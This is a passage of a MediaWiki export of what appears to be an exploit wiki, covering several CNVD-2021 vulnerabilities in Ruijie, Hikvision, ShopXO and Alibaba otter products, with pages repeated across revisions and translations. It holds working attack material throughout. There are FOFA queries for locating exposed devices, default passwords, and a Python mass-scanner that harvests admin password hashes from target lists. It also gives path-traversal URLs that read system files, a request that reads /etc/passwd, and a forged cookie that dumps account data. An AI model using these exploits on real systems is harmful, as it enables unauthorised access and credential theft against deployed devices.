    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;
==參考==
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>1o6dis5kbs9ms77fehkgqugoiun56vn</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14536 銳捷RG-UAC信息洩露漏洞/zh-tw</title>
    <ns>0</ns>
    <id>146</id>
    <revision>
      <id>234</id>
      <timestamp>2021-03-08T06:34:28Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>正在更新來源頁面以與新版本相符</comment>
      <origin>234</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2314" sha1="svo2736mk8b9c8ga03uu4lgvg1n908q" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;

F12查看網頁源碼搜索關鍵字&lt;code&gt;admin&lt;/code&gt;

[[檔案:Cnvd1.jpg|400px]]

使用 password值 md5解密即可登錄。(用戶名admin)

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;

==參考==
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>svo2736mk8b9c8ga03uu4lgvg1n908q</sha1>
    </revision>
    <revision>
      <id>855</id>
      <parentid>234</parentid>
      <timestamp>2021-04-01T04:23:40Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>855</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2351" sha1="1o6dis5kbs9ms77fehkgqugoiun56vn" xml:space="preserve">&lt;languages /&gt;
==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;
F12查看網頁源碼搜索關鍵字&lt;code&gt;admin&lt;/code&gt;

或在URL后拼接/get_dkey.php?user=admin

[[File:Cnvd1.jpg|400px]]

使用 password值 md5解密即可登錄。(用戶名admin)
==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;
==參考==
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>1o6dis5kbs9ms77fehkgqugoiun56vn</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14544 HIKVISION 流媒體管理服務器 後台任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>458</id>
    <revision>
      <id>657</id>
      <timestamp>2021-03-26T03:43:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; 杭州海康威视数字技术股份有限公司 流媒体管理服务器 V2.3.5 &lt;/pre&gt;  ==FOFA== &lt;pre&gt; FOFA：..."</comment>
      <origin>657</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="578" sha1="8lthdrsc58y5zqaeg8vy1eojxl0bekx" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
杭州海康威视数字技术股份有限公司 流媒体管理服务器 V2.3.5
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
FOFA：title="流媒体管理服务器"
&lt;/pre&gt;


&lt;translate&gt;
==默認登錄信息==
&lt;/translate&gt;
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

==POC==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
&lt;/pre&gt;

&lt;translate&gt;
成功讀取 C:/windows/system.ini
&lt;/translate&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://mp.weixin.qq.com/s/bnXxGWs0ft0G6Qcdlf9BDw</text>
      <sha1>8lthdrsc58y5zqaeg8vy1eojxl0bekx</sha1>
    </revision>
    <revision>
      <id>658</id>
      <parentid>657</parentid>
      <timestamp>2021-03-26T03:44:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>658</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="622" sha1="l31zgmpdxprhq9yw4f0sqvh2rvvqz4q" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
杭州海康威视数字技术股份有限公司 流媒体管理服务器 V2.3.5
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
FOFA：title="流媒体管理服务器"
&lt;/pre&gt;


&lt;translate&gt;
==默認登錄信息== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

==POC==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
成功讀取 C:/windows/system.ini
&lt;/translate&gt;

&lt;translate&gt;
==參考== &lt;!--T:4--&gt;
&lt;/translate&gt;
https://mp.weixin.qq.com/s/bnXxGWs0ft0G6Qcdlf9BDw</text>
      <sha1>l31zgmpdxprhq9yw4f0sqvh2rvvqz4q</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14544 HIKVISION 流媒體管理服務器 後台任意文件讀取漏洞/zh-hans</title>
    <ns>0</ns>
    <id>4247</id>
    <revision>
      <id>4883</id>
      <timestamp>2021-06-12T09:41:20Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==参考=="</comment>
      <origin>4883</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="478" sha1="egja1ffqftn44v8qg169mbn7t3cum1d" xml:space="preserve">&lt;languages  /&gt;

==漏洞影响==
&lt;pre&gt;
杭州海康威视数字技术股份有限公司 流媒体管理服务器 V2.3.5
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
FOFA：title="流媒体管理服务器"
&lt;/pre&gt;


==默认登陆信息==
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

==POC==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
&lt;/pre&gt;

成功读取 C:/windows/system.ini

==参考==
https://mp.weixin.qq.com/s/bnXxGWs0ft0G6Qcdlf9BDw</text>
      <sha1>egja1ffqftn44v8qg169mbn7t3cum1d</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14544 HIKVISION 流媒體管理服務器 後台任意文件讀取漏洞/zh-hant</title>
    <ns>0</ns>
    <id>2987</id>
    <revision>
      <id>3488</id>
      <timestamp>2021-05-26T13:32:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==默認登錄信息=="</comment>
      <origin>3488</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="478" sha1="qbynkls7q6kz93zj9zzt2l83a03ohyg" xml:space="preserve">&lt;languages  /&gt;

==漏洞影響==
&lt;pre&gt;
杭州海康威视数字技术股份有限公司 流媒体管理服务器 V2.3.5
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
FOFA：title="流媒体管理服务器"
&lt;/pre&gt;


==默認登錄信息==
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

==POC==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
&lt;/pre&gt;

成功讀取 C:/windows/system.ini

==參考==
https://mp.weixin.qq.com/s/bnXxGWs0ft0G6Qcdlf9BDw</text>
      <sha1>qbynkls7q6kz93zj9zzt2l83a03ohyg</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14544海康威視 流媒體管理服務器任意文件讀取/通用弱口令</title>
    <ns>0</ns>
    <id>526</id>
    <revision>
      <id>729</id>
      <timestamp>2021-03-27T08:54:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  ==FOFA== &lt;pre&gt; title="流媒体管理服务器" &lt;/pre&gt;  ==Login== &lt;pre&gt; admin/12345 &lt;/pre&gt;  &lt;translate&gt; ==文件讀取== &lt;/translate&gt; &lt;pre&gt; /systemLog/downFil..."</comment>
      <origin>729</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="233" sha1="q95j5xr8g3ge9qj8uzqrj8vkp4ejrd9" xml:space="preserve">&lt;languages   /&gt;

==FOFA==
&lt;pre&gt;
title="流媒体管理服务器"
&lt;/pre&gt;

==Login==
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

&lt;translate&gt;
==文件讀取==
&lt;/translate&gt;
&lt;pre&gt;
/systemLog/downFile.php?fileName=../../../../../../../windows/win.ini
&lt;/pre&gt;</text>
      <sha1>q95j5xr8g3ge9qj8uzqrj8vkp4ejrd9</sha1>
    </revision>
    <revision>
      <id>730</id>
      <parentid>729</parentid>
      <timestamp>2021-03-27T08:54:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>730</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="244" sha1="b49larus49d7c1e68i87vk1zi3fqa5r" xml:space="preserve">&lt;languages   /&gt;

==FOFA==
&lt;pre&gt;
title="流媒体管理服务器"
&lt;/pre&gt;

==Login==
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

&lt;translate&gt;
==文件讀取== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
/systemLog/downFile.php?fileName=../../../../../../../windows/win.ini
&lt;/pre&gt;</text>
      <sha1>b49larus49d7c1e68i87vk1zi3fqa5r</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14544海康威視 流媒體管理服務器任意文件讀取/通用弱口令/en</title>
    <ns>0</ns>
    <id>4255</id>
    <revision>
      <id>4892</id>
      <timestamp>2021-06-12T10:03:29Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==File Reading=="</comment>
      <origin>4892</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="208" sha1="5g5coipmy3gpdpcrho3cbbkm5hu52ww" xml:space="preserve">&lt;languages   /&gt;

==FOFA==
&lt;pre&gt;
title="流媒体管理服务器"
&lt;/pre&gt;

==Login==
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

==File Reading==
&lt;pre&gt;
/systemLog/downFile.php?fileName=../../../../../../../windows/win.ini
&lt;/pre&gt;</text>
      <sha1>5g5coipmy3gpdpcrho3cbbkm5hu52ww</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14544海康威視 流媒體管理服務器任意文件讀取/通用弱口令/zh-hans</title>
    <ns>0</ns>
    <id>4251</id>
    <revision>
      <id>4887</id>
      <timestamp>2021-06-12T09:41:39Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==文件读取=="</comment>
      <origin>4887</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="208" sha1="jleb9ts5ru1fvh9pnam8xqzqoctr5up" xml:space="preserve">&lt;languages   /&gt;

==FOFA==
&lt;pre&gt;
title="流媒体管理服务器"
&lt;/pre&gt;

==Login==
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

==文件读取==
&lt;pre&gt;
/systemLog/downFile.php?fileName=../../../../../../../windows/win.ini
&lt;/pre&gt;</text>
      <sha1>jleb9ts5ru1fvh9pnam8xqzqoctr5up</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14544海康威視 流媒體管理服務器任意文件讀取/通用弱口令/zh-hant</title>
    <ns>0</ns>
    <id>4254</id>
    <revision>
      <id>4891</id>
      <timestamp>2021-06-12T09:57:32Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==文件讀取=="</comment>
      <origin>4891</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="208" sha1="g655l6eazpwy33doqpkk206iq627kwh" xml:space="preserve">&lt;languages   /&gt;

==FOFA==
&lt;pre&gt;
title="流媒体管理服务器"
&lt;/pre&gt;

==Login==
&lt;pre&gt;
admin/12345
&lt;/pre&gt;

==文件讀取==
&lt;pre&gt;
/systemLog/downFile.php?fileName=../../../../../../../windows/win.ini
&lt;/pre&gt;</text>
      <sha1>g655l6eazpwy33doqpkk206iq627kwh</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-15822 ShopXO 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>2536</id>
    <revision>
      <id>3033</id>
      <timestamp>2021-05-22T02:17:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; app="ShopXO企业级B2C电商系统提供商" &lt;/pre&gt;  ==POC== &lt;pre&gt; GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host:  User-Age..."</comment>
      <origin>3033</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="506" sha1="bpn47k0cfb5gtajiumo4azeav52kdfc" xml:space="preserve">==FOFA==
&lt;pre&gt;
app="ShopXO企业级B2C电商系统提供商"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/pre&gt;</text>
      <sha1>bpn47k0cfb5gtajiumo4azeav52kdfc</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-16592 阿里巴巴otter manager分佈式數據庫同步系統信息洩漏/默認口令</title>
    <ns>0</ns>
    <id>2525</id>
    <revision>
      <id>3021</id>
      <timestamp>2021-05-22T01:54:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; title="Otter Manager" &lt;/pre&gt;  ==默認口令== &lt;pre&gt; admin/admin &lt;/pre&gt;  ==信息泄漏== 進入後直接f12查看元素，修改password為text即可查看數..."</comment>
      <origin>3021</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="204" sha1="52knah7tocivwsaqnftdyzbnooo2n5f" xml:space="preserve">==FOFA==
&lt;pre&gt;
title="Otter Manager"
&lt;/pre&gt;

==默認口令==
&lt;pre&gt;
admin/admin
&lt;/pre&gt;

==信息泄漏==
進入後直接f12查看元素，修改password為text即可查看數據庫等敏感信息密碼。</text>
      <sha1>52knah7tocivwsaqnftdyzbnooo2n5f</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-17369 銳捷Smartweb管理系統 密碼信息洩露漏洞</title>
    <ns>0</ns>
    <id>742</id>
    <revision>
      <id>984</id>
      <timestamp>2021-04-04T06:39:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  ==FOFA== &lt;pre&gt; title="无线smartWeb--登录页面" &lt;/pre&gt;  &lt;translate&gt; ==默認guest密碼== &lt;/translate&gt;  &lt;pre&gt; guest/guest &lt;/pre&gt;   &lt;translate&gt; ==漏洞位..."</comment>
      <origin>984</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="608" sha1="qs4th8cskzc7piech4p11bc65goi4tg" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

&lt;translate&gt;
==默認guest密碼==
&lt;/translate&gt;

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


&lt;translate&gt;
==漏洞位置==
&lt;/translate&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
Cookice添加以下內容
&lt;/translate&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


&lt;translate&gt;
可以獲取所有賬戶信息
&lt;/translate&gt;


&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>qs4th8cskzc7piech4p11bc65goi4tg</sha1>
    </revision>
    <revision>
      <id>985</id>
      <parentid>984</parentid>
      <timestamp>2021-04-04T06:40:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>985</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="674" sha1="ad01uczqszjdmxvizrxuhsh5r67igt0" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

&lt;translate&gt;
==默認guest密碼== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


&lt;translate&gt;
==漏洞位置== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用== &lt;!--T:3--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
Cookice添加以下內容
&lt;/translate&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:5--&gt;
可以獲取所有賬戶信息
&lt;/translate&gt;


&lt;translate&gt;
==參考== &lt;!--T:6--&gt;
&lt;/translate&gt;
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>ad01uczqszjdmxvizrxuhsh5r67igt0</sha1>
    </revision>
    <revision>
      <id>7038</id>
      <parentid>985</parentid>
      <timestamp>2021-07-12T07:07:16Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>修改错别字</comment>
      <origin>7038</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="668" sha1="me6dv34yqohgeyk5gsclbo1f3sql401" xml:space="preserve">&lt;languages  /&gt;
==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;
&lt;translate&gt;
==默認guest密碼== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
guest/guest
&lt;/pre&gt;


&lt;translate&gt;
==漏洞位置== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:4--&gt;
Cookie添加以下內容
&lt;/translate&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:5--&gt;
可以獲取所有賬戶信息
&lt;/translate&gt;


&lt;translate&gt;
==參考== &lt;!--T:6--&gt;
&lt;/translate&gt;
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>me6dv34yqohgeyk5gsclbo1f3sql401</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-17369 銳捷Smartweb管理系統 密碼信息洩露漏洞/en</title>
    <ns>0</ns>
    <id>4873</id>
    <revision>
      <id>5612</id>
      <timestamp>2021-06-24T01:44:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Default guest password=="</comment>
      <origin>5612</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="471" sha1="4381vgw6hliwo1kejidd6ew84eukzl5" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

==Default guest password==

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==Vulnerability location==

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


==Exploit==

Cookie add the following
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


Can get all account information


==Reference==
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>4381vgw6hliwo1kejidd6ew84eukzl5</sha1>
    </revision>
    <revision>
      <id>7102</id>
      <parentid>5612</parentid>
      <timestamp>2021-07-13T04:05:22Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>7102</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="506" sha1="hut1tbjwe54d27ig5i9tsn8954dbk9g" xml:space="preserve">&lt;languages  /&gt;
==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;
==Default guest password==
&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==Vulnerability location==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


==Exploit==
&lt;div class="mw-translate-fuzzy"&gt;
Cookie add the following
&lt;/div&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


Can get all account information


==Reference==
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>hut1tbjwe54d27ig5i9tsn8954dbk9g</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-17369 銳捷Smartweb管理系統 密碼信息洩露漏洞/zh-cn</title>
    <ns>0</ns>
    <id>6149</id>
    <revision>
      <id>7029</id>
      <timestamp>2021-07-12T07:04:25Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "CNVD-2021-17369 锐捷Smartweb管理系统 密码信息泄露漏洞"</comment>
      <origin>7029</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="763" sha1="57u4wokr9l50tz9na7x4m8vz7par5dn" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

==默认guest密码==

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞位置==
&lt;/div&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Cookice添加以下內容
&lt;/div&gt;
&lt;pre&gt;
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
可以獲取所有賬戶信息
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ</text>
      <sha1>57u4wokr9l50tz9na7x4m8vz7par5dn</sha1>
    </revision>
    <revision>
      <id>7032</id>
      <parentid>7029</parentid>
      <timestamp>2021-07-12T07:04:36Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "==漏洞位置=="</comment>
      <origin>7032</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="702" sha1="7obebxy4gvxvmu4mp7xfsj0y32q5syf" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
title="无线smartWeb--登录页面"
&lt;/pre&gt;

==默认guest密码==

&lt;pre&gt;
guest/guest
&lt;/pre&gt;


==漏洞位置==

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
